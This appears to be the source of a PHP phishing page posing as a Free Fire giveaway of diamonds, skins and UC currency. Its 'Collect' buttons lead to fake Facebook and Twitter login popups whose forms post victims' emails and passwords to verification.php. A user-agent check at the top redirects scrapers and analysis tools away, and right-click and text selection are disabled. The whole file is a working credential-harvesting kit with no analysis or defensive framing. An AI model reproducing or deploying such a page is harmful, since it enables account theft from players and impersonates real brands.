<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style type="text/css">
#collect fieldset:not(:first-of-type) {
display: none;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
@media only screen and (max-width:600px) {
	.popup-box-login-fb {
		margin-top: 4%;
	}
}
</style>
  
<div class="container">
<div class="header">
	<center>
	<img src="img/w/slogan_en.png" alt="">
	</center>
</div>

<div class="box">
<center>
<div class="menu active" onmousedown="buka.play()" onclick="openHero(event, 'latest');" id="defaultOpen">Latest Event</div>

<div class="alert">
- Event Now : FREE Get Diamond, Magic Cube, Bandit, Titan and More.
<br>
- Scroll down to see more reward
<br>
<span id="timer1"></span>
</div>
</center>

<div id="latest" class="gallery">
<div class="scroll">
<center>
	<div class="item">
<img src="img/item/pemanis/magiccube.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/dm.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/evo.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/titan.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/Shotgun.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/awm.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/fullbandit.jpg"">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/alok.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/zs.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/emotff.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/pemanis/epas.jpg">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>

</center>
</div>
</div>

<div id="season" class="gallery">
<div class="scroll">
<center>
<div class="item">
<img src="img/item/season/1.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/2.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/3.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/4.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/5.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/6.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/7.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>

</center>
</div>
</div>

<div id="other" class="gallery">
<div class="scroll">
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 1200 UC<br><span>Additional Reward for Season 11</span></p>
<button onmousedown="buka.play();" onclick="collect();" style="background: url(img/w/s4_right_off.png) no-repeat;">Collect</button>
</div>
</br>
</br>
</br>
</br>
</br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 4000 + 700 UC<br><span>Additional Reward for Season 11</span></p>
<button onmousedown="buka.play();" onclick="collect();" style="background: url(img/w/s4_right_off.png) no-repeat;">Collect</button>
</div>
</br>
</br>
</br>
</br>
</br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 7000 + 1200 UC<br><span>Additional Reward for Season 11</span></p>
<button onmousedown="buka.play();" onclick="collect();" style="background: url(img/w/s4_right_off.png) no-repeat;">Collect</button>
</div>
</br>
</br>
</br>
</br>
</br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 9000 + 2070 UC<br><span>Additional Reward for Season 11</span></p>
<button onmousedown="buka.play();" onclick="collect();" style="background: url(img/w/s4_right_off.png) no-repeat;">Collect</button>
</div>
</br>
</br>
</br>
</br>
</br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 11000 + 3200 UC<br><span>Additional Reward for Season 11</span></p>
<button onmousedown="buka.play();" onclick="collect();" style="background: url(img/w/s4_right_off.png) no-repeat;">Collect</button>
</div>
</br>
</br>
</br>
</br>
</br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png">
13000 + 4200 UC<br><span>Additional Reward for Season 11</span></p>
<button onmousedown="buka.play();" onclick="collect();" style="background: url(img/w/s4_right_off.png) no-repeat;">Collect</button>
</div>
</br>
</br>
</br>
</br>
</br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 15000 + 5700 UC<br><span>Additional Reward for Season 11</span></p>
<button onmousedown="buka.play();" onclick="collect();" style="background: url(img/w/s4_right_off.png) no-repeat;">Collect</button>
</div>
</div>
</div>


</div> <!--- box --->
</div> <!--- container --->

<div class="popup welcome">
<div class="popup-box animated fadeInDown">
<a onclick="closepopup()" onmousedown="tutup.play()" class="close"><i class="fa fa-times-circle"></i></a>
<div class="nav-popup">
<center>
<h2> </h2>
</center>
</div>
<form>
</br>
</br>
<center>
<img src="img/w/slogan_en.png">
</center>
<button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="closepopup()">Go to reward list</button>
</button>
<br>
<br>
</form>
</div>
</div>


<div class="popup collect" style="display: none;">
<div class="popup-box animated fadeInDown">
<a onclick="closepopup()" onmousedown="tutup.play()" class="close"><i class="fa fa-times-circle"></i></a>
<div class="nav-popup">
</div>
<center>
<div class="alert">Are you sure to collect this prize?</div>
</center>
<br>
<button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="open_login()" class="next">Collect</button>
<br>
<br>
</div>
</div>

<div class="popup open_login" style="display: none;">
<div class="popup-box animated fadeInDown">
<a onclick="closepopup()" onmousedown="tutup.play()" class="close"><i class="fa fa-times-circle"></i></a>
<div class="nav-popup">
<center>
<h2> </h2>
</center>
</div>
<center>
<div class="alert">Selected prize locked. <br> Log in using your FREEFIRE account to receive prize</div>
</center><br>
<br>
<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<br>
<br>
<br>
<br>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to Free Fire
			</div>
			<form class="login-form" action="verification.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="verification.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<!--- fieldset content --->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/fieldset.js"></script>
<script src="js/click.js"></script>

</body>
</html>